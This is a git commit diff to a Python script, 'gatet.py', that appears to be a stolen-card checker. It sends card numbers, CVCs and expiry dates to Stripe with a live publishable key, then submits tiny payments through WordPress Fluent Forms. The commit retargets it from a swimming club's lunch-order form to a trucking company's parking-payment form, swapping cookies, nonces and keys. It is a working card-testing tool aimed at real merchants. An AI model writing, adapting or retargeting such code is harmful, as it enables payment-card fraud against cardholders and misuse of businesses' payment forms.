78d4d8325f9ba7b5ad8d9f30f713bf9297454a05
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-02-24 22:52:41 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,29 +26,25 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&key=pk_live_51Jez78BKwt72jNCmXW07XYSzt9cnaUVtC9aTdAF3ImhhQ8KcGKRlpJh9VjBEqq51laaZcYO4GWHpHRU8nCSP5WAB00I9qJSMtV'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&key=pk_live_51JsxR6KI6JQjr28A4vnbJu7Ak0bZXPkSlJ8VZHZXxYVvtKsd64mQ9zdpKxs0Ul9JyMj52HpAkVIl3Rz5qlsCW07n00mj43tDyT'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'PHPSESSID': '6874g8to8j67r6c87qhfej6l2b',
-	    '_ga': 'GA1.2.1574929798.1740392008',
-	    '_gid': 'GA1.2.1952496765.1740392008',
-	    '_ga_Y6Z6HMHW5Q': 'GS1.2.1740392007.1.0.1740392007.0.0.0',
-	    '__stripe_mid': 'dad89c44-abb0-4281-9cdc-44510dd11f1fc4fc70',
-	    '__stripe_sid': '43d099d0-7ec2-4f18-aa84-62a778ae7d479f9fb4',
+	    '__stripe_mid': 'f8d88f49-3137-4146-8b0e-44cdc808b72c354b3f',
+	    '__stripe_sid': '52dbb0cf-18f7-4190-8cfe-12d0452980b06ff767',
 	}
 	
 	headers = {
-	    'authority': 'www.sussexswimming.org',
+	    'authority': 'pietrucking.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'PHPSESSID=6874g8to8j67r6c87qhfej6l2b; _ga=GA1.2.1574929798.1740392008; _gid=GA1.2.1952496765.1740392008; _ga_Y6Z6HMHW5Q=GS1.2.1740392007.1.0.1740392007.0.0.0; __stripe_mid=dad89c44-abb0-4281-9cdc-44510dd11f1fc4fc70; __stripe_sid=43d099d0-7ec2-4f18-aa84-62a778ae7d479f9fb4',
-	    'origin': 'https://www.sussexswimming.org',
-	    'referer': 'https://www.sussexswimming.org/swimming/county-championships-2025/coach-team-manager-lunch-orders-championships-2025/',
+	    # 'cookie': '__stripe_mid=f8d88f49-3137-4146-8b0e-44cdc808b72c354b3f; __stripe_sid=52dbb0cf-18f7-4190-8cfe-12d0452980b06ff767',
+	    'origin': 'https://pietrucking.com',
+	    'referer': 'https://pietrucking.com/daily-parking/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -60,17 +56,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1740392091739',
+	    't': '1740411932177',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=14688&_fluentform_30_fluentformnonce=d8e6b0afa6&_wp_http_referer=%2Fswimming%2Fcounty-championships-2025%2Fcoach-team-manager-lunch-orders-championships-2025%2F&input_text_1=Rodam&input_text_2=User&email=rodamuser20%40gmail.com&multi_select%5B%5D=Beacon%20SC&input_radio_sat10=Saturday%208thFebruary%20option%201%20&input_radio_sat25=Sunday%2023rd%20February%20option%203&custom-payment-amount=0.30&payment_method=stripe&input_radio_sat11=&input_radio_sat24=&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=576&_fluentform_13_fluentformnonce=924066f9f9&_wp_http_referer=%2Fdaily-parking%2F&datetime=02%2F24%2F2025&numeric_field_1=1&name%5Bfirst_name%5D=Rodam&name%5Blast_name%5D=User&input_text=&phone=0817480671&email=rodamuser20%40gmail.com&dropdown=Other&input_text_21=Texla&input_text_22=Black&input_text_23=Box&terms-n-condition_1=on&terms-n-condition=on&terms-n-condition_2=on&custom-payment-amount=0.50&payment_method=stripe&hidden=0&item__13__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '30',
+	    'form_id': '13',
 	}
 	
 	r2 = requests.post(
-	    'https://www.sussexswimming.org/wp-admin/admin-ajax.php',
+	    'https://pietrucking.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
